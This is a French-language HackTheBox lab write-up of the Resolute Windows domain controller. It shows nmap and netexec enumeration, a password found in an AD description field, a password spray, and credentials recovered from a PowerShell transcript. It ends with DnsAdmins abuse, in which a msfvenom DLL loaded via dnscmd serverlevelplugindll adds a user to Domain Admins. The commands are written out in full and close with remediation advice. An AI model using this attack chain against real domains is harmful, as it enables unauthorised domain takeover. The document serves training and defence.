# Resolute — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows Server (contrôleur de domaine) |
| **Difficulté** | 🟡 Medium |
| **Date** | 2026-10-04 |
| **Vecteur** | mot de passe dans un attribut `description` (`marko`) → **password spray** → `melanie` → transcript PowerShell → `ryan` → **DnsAdmins** → DLL chargée par le service DNS (SYSTEM) → Domain Admin |
| **CVE** | aucune — abus de configuration AD |
| **Tags** | active-directory · password-in-description · password-spray · dnsadmins |

> `<IP_CIBLE>` = IP de session. Domaine dans `/etc/hosts`.

> 🎯 **Nouveautés à apprendre ici** :
> 1) **Mot de passe dans un attribut `description`** + **password spraying** (le mdp d'un compte marche pour un autre).
> 2) **DnsAdmins** : ce groupe peut faire charger une **DLL malveillante par le service DNS** (qui tourne en SYSTEM) → exécution SYSTEM.

---

## TL;DR

L'énumération **anonyme** des utilisateurs révèle un mot de passe planqué dans l'attribut **`description`**
de `marko` ("Account created. Password set to **Welcome123!**"). Ce mdp n'est pas celui de marko → **password
spray** sur toute la liste : il matche **`melanie`** → WinRM (user flag). En fouillant, un **transcript
PowerShell** oublié dans `C:\PSTranscripts` livre les identifiants de **`ryan`** (`Serv3r4Admin4cc123!`),
membre de **`DnsAdmins`**. Ce groupe impose au service DNS (SYSTEM) de charger une **DLL** via
`serverlevelplugindll` : on y met une DLL qui **ajoute ryan aux Domain Admins**, on redémarre le service →
ryan devient DA. Après **reconnexion** (nouveau jeton), accès Administrator → root.

**description (`marko`) → spray → `melanie` → transcript → `ryan` (DnsAdmins) → DLL en SYSTEM → Domain Admin.**

---

## 1. Reconnaissance & énumération

```bash
┌──(kali㉿kali)-[~/nmap/Resolute]
└─$ nmap -sC -sV -p- 10.129.96.155                                             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 21:20 +0200
Nmap scan report for 10.129.96.155
Host is up (0.025s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-04 19:28:03Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49697/tcp open  tcpwrapped
49711/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m01s, deviation: 4h02m32s, median: 6m59s
| smb2-time: 
|   date: 2026-10-04T19:28:52
|_  start_date: 2026-10-04T19:26:16
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2026-10-04T12:28:55-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.25 seconds

┌──(kali㉿kali)-[~/nmap/Resolute]
└─$ nxc smb 10.129.96.155 -u '' -p '' --shares                    
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\: 
SMB         10.129.96.155   445    RESOLUTE         [-] Error enumerating shares: STATUS_ACCESS_DENIED

# énum users en anonyme + LIRE les descriptions
rpcclient -U '' -N <IP_CIBLE>   # enumdomusers ; queryuser <rid>
┌──(kali㉿kali)-[~/nmap/Resolute]
└─$ nxc smb 10.129.96.155 -u '' -p '' --users
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\: 
SMB         10.129.96.155   445    RESOLUTE         -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                   
SMB         10.129.96.155   445    RESOLUTE         Administrator                 2026-10-04 19:30:06 0       Built-in account for administering the computer/domain                                          
SMB         10.129.96.155   445    RESOLUTE         Guest                         <never>             0       Built-in account for guest access to the computer/domain                                        
SMB         10.129.96.155   445    RESOLUTE         krbtgt                        2019-09-25 13:29:12 0       Key Distribution Center Service Account                                                         
SMB         10.129.96.155   445    RESOLUTE         DefaultAccount                <never>             0       A user account managed by the system.                                                           
SMB         10.129.96.155   445    RESOLUTE         ryan                          2026-10-04 19:32:02 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         marko                         2019-09-27 13:17:14 0       Account created. Password set to Welcome123!                                                    
SMB         10.129.96.155   445    RESOLUTE         sunita                        2019-12-03 21:26:29 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         abigail                       2019-12-03 21:27:30 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         marcus                        2019-12-03 21:27:59 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         sally                         2019-12-03 21:28:29 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         fred                          2019-12-03 21:29:01 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         angela                        2019-12-03 21:29:43 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         felicia                       2019-12-03 21:30:53 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         gustavo                       2019-12-03 21:31:42 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         ulf                           2019-12-03 21:32:19 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         stevie                        2019-12-03 21:33:13 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         claire                        2019-12-03 21:33:44 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         paulo                         2019-12-03 21:34:46 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         steve                         2019-12-03 21:35:25 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         annette                       2019-12-03 21:36:55 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         annika                        2019-12-03 21:37:23 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         per                           2019-12-03 21:38:12 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         claude                        2019-12-03 21:39:56 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         melanie                       2026-10-04 19:30:06 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         zach                          2019-12-04 10:39:27 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         simon                         2019-12-04 10:39:58 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         naoki                         2019-12-04 10:40:44 0                                                                                                       
SMB         10.129.96.155   445    RESOLUTE         [*] Enumerated 27 local users: MEGABANK

nxc smb 10.129.96.155 -u '' -p '' --users 2>/dev/null \
  | awk '{print $5}' \
  | grep -vE '^\[|^-|^$' \
  | sort -u > users.txt
```
## 2. Foothold — password spraying

```bash
nxc smb <IP_CIBLE> -u users.txt -p '<mdp_trouvé>' --continue-on-success
# le mot de passe matche un compte → evil-winrm
```
- Mot de passe repéré dans une `description` : `Welcome123!`
- Compte associé (peut être un AUTRE compte) : `melanie`

> Réflexe : le champ **`description`** contient parfois un mot de passe initial (« Account created, pwd ... »). Il n'appartient pas forcément au compte cité → teste-le sur **tous** (spray).

---

- Compte validé par spray : `melanie`
- Accès : `evil-winrm -i <IP_CIBLE> -u <user> -p '<mdp>'`

**Flag user :** desktop (non publié).

> Après le 1er accès, **fouille** : historique PowerShell, dossiers cachés (`dir -force`), transcripts →
> souvent un 2e compte (`ryan`) avec des creds, membre de **DnsAdmins**.

```powershell
*Evil-WinRM* PS C:\Users\melanie> cmd /c "dir /a /s /b C:\PSTranscripts"
C:\PSTranscripts\20191203
C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt 
```

- 2e compte trouvé (membre DnsAdmins) : `ryan`

```bash
┌──(kali㉿kali)-[~/nmap/Resolute]
└─$ nxc smb 10.129.96.155 -u 'ryan' -p 'Serv3r4Admin4cc123!' --shares
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)                                                                                                      
SMB         10.129.96.155   445    RESOLUTE         [*] Enumerated shares
SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
SMB         10.129.96.155   445    RESOLUTE         -----           -----------     ------
SMB         10.129.96.155   445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.129.96.155   445    RESOLUTE         C$                              Default share
SMB         10.129.96.155   445    RESOLUTE         IPC$            READ            Remote IPC
SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share 
SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share 
                                                                                                       
*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

```

---

## 3. Privesc — DnsAdmins (DLL malveillante)

**Méthode :** un membre de **DnsAdmins** peut indiquer au **service DNS** (qui tourne en **SYSTEM**) de
charger une **DLL arbitraire**. On génère une DLL (reverse shell / ajout d'admin), on la fait charger, on
redémarre le service DNS → exécution **SYSTEM**.

```bash
# 1) générer la DLL
┌──(kali㉿kali)-[~/nmap/Resolute]
└─$ # 1) générer une DLL (ajout d'admin ou reverse shell)
msfvenom -p windows/x64/exec CMD='net group "Domain Admins" ryan /add /domain' -f dll -o evil.dll
# l'héberger (SMB/HTTP)
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 311 bytes
Final size of dll file: 9216 bytes
Saved as: evil.dll

# (ou reverse shell) — héberger via SMB/HTTP
```
```powershell
# 2) en tant que membre DnsAdmins : pointer le DNS vers la DLL
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll C:\Users\ryan\Documents\evil.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe query dns  

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x4e20
        PID                : 2316
        FLAGS              :
*Evil-WinRM* PS C:\Users\ryan\Documents> net group "Domain Admins" /domain
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            ryan
The command completed successfully.


```

- Groupe abusé : `DnsAdmins`
- Pourquoi ça marche (oral) : le service DNS tourne en **SYSTEM** et expose l'option `serverlevelplugindll` ; un membre de **DnsAdmins** y met le chemin de sa DLL → au **redémarrage** du service, `dns.exe` charge la DLL et exécute son `DllMain` **en SYSTEM**. Ici le `DllMain` ajoute ryan aux Domain Admins (visible : `Members : Administrator  ryan`).

> ⚠️ **Nouveau jeton requis** : l'appartenance aux groupes est figée au **login**. La session `ryan` courante ne « voit » pas encore qu'il est DA → il faut **se reconnecter** (`evil-winrm -i <IP> -u ryan -p 'Serv3r4Admin4cc123!'`) pour obtenir un jeton avec Domain Admins, puis lire `C:\Users\Administrator\Desktop\root.txt`.

**Flag root :** `C:\Users\Administrator\Desktop\root.txt` (non publié).

---

## 4. Remédiation

- Ne **jamais** mettre de mot de passe dans les attributs (`description`, `info`).
- Politique anti-spray : MFA, verrouillage, mots de passe uniques.
- **DnsAdmins** = groupe à très haut privilège (équivalent SYSTEM sur le DC) → n'y mettre personne, auditer.
- Retirer aux comptes le droit de redémarrer le service DNS.

---

## 5. Leçons

- <mot de passe dans description + spray : le mdp d'un compte peut ouvrir un autre>
- <fouille post-accès : history, transcripts, dossiers cachés>
- <DnsAdmins → DLL SYSTEM : un groupe « anodin » qui vaut Domain Admin>

---

## Références

- Fiches liées : [smb](../outils/smb.md) · [bloodhound](../outils/bloodhound.md) · [ad-attacks](../outils/ad-attacks.md) · [windows-privesc](../outils/windows-privesc.md) · [reverse-shells](../outils/reverse-shells.md)
